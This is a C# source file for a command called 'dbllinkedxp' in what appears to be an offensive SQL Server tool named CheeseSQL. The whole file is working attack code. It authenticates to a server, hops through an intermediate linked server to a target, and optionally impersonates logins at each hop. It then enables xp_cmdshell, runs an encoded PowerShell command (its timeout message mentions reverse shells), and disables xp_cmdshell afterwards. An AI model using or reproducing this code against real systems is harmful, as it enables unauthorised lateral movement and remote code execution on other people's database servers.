using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class dbllinkedxp : ICommand
    {
        public static string CommandName => "dbllinkedxp";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command on Doubly Linked SQL Server via 'xp_cmdshell'";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/intermediate:INTERMEDIATE " +
                $"/target:TARGET " +
                $"/command:COMMAND " +
                $"[/impersonate:USER] " +
                $"[/impersonate-intermediate:USER] " +
                $"[/impersonate-linked:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            string user = "";
            string password = "";
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string intermediate = "";
            string target = "";
            string cmd = "";
            string impersonate = "";
            string impersonate_intermediate = "";
            string impersonate_linked = "";

            bool sqlauth = false;

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/intermediate"))
            {
                intermediate = arguments["/intermediate"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                impersonate = arguments["/impersonate"];
            }
            if (arguments.ContainsKey("/impersonate-intermediate"))
            {
                impersonate_intermediate = arguments["/impersonate-intermediate"];
            }
            if (arguments.ContainsKey("/impersonate-linked"))
            {
                impersonate_linked = arguments["/impersonate-linked"];
            }
            if (arguments.ContainsKey("/target"))
            {
                target = arguments["/target"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(intermediate))
            {
                Console.WriteLine("\r\n[X] You must supply an intermediate server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(target))
            {
                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            if (sqlauth)
            {
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/password"))
                {
                    password = arguments["/password"];
                }
                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(password))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
                    return;
                }
                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
            }
            else
            {
                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                return;
            }

            string enableAdvOptions = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            if (!String.IsNullOrEmpty(impersonate_linked) && !String.IsNullOrEmpty(impersonate_intermediate))
            {
                enableAdvOptions = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_linked))
            {
                enableAdvOptions = $"EXEC ('EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_intermediate))
            {
                enableAdvOptions = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                enableAdvOptions = $"EXECUTE AS LOGIN = '{impersonate}' {enableAdvOptions}";
            }
            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling Advanced options..");
            reader.Close();

            string enableXP = $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            if (!String.IsNullOrEmpty(impersonate_linked) && !String.IsNullOrEmpty(impersonate_intermediate))
            {
                enableXP = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_linked))
            {
                enableXP = $"EXEC ('EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_intermediate))
            {
                enableXP = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                enableXP = $"EXECUTE AS LOGIN = '{impersonate}' {enableXP}";
            }

            command = new SqlCommand(enableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling xp_cmdshell..");
            reader.Close();

            string execCmd = $"EXEC ('EXEC (''xp_cmdshell ''''powershell -enc {cmd}'''';'') AT {target}') AT {intermediate}";
            if (!String.IsNullOrEmpty(impersonate_linked) && !String.IsNullOrEmpty(impersonate_intermediate))
            {
                execCmd = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC xp_cmdshell ''''powershell -enc {cmd}'''';'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_linked))
            {
                execCmd = $"EXEC ('EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC xp_cmdshell ''''powershell -enc {cmd}'''';'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_intermediate))
            {
                execCmd = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''xp_cmdshell ''''powershell -enc {cmd}'''';'') AT [{target}]') AT [{intermediate}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                execCmd = $"EXECUTE AS LOGIN = '{impersonate}' {execCmd}";
            }

            try
            {
                command = new SqlCommand(execCmd, connection);
                Console.WriteLine("[*] Executing command..");
                using (reader = command.ExecuteReader())
                {
                    try
                    {
                        reader.Read();
                        Console.WriteLine("[+] Command result: " + reader[0]);
                    }
                    catch { }
                }
            }
            catch (SqlException e)
            {
                if (e.Message.Contains("Execution Timeout Expired"))
                {
                    Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is normal");
                    connection = new SqlConnection(connectInfo);
                    connection.Open();
                }
                else
                {
                    Console.WriteLine($"[-] Exception: {e.Message}");
                    return;
                }
            }

            string disableXP = $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 0; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            if (!String.IsNullOrEmpty(impersonate_linked) && !String.IsNullOrEmpty(impersonate_intermediate))
            {
                disableXP = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''xp_cmdshell'''', 0; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_linked))
            {
                disableXP = $"EXEC ('EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''xp_cmdshell'''', 0; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }
            else if (!String.IsNullOrEmpty(impersonate_intermediate))
            {
                disableXP = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''sp_configure ''''xp_cmdshell'''', 0; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                disableXP = $"EXECUTE AS LOGIN = '{impersonate}' {disableXP}";
            }

            command = new SqlCommand(disableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Disabling xp_cmdshell..");
            reader.Close();

            connection.Close();
        }
    }
}
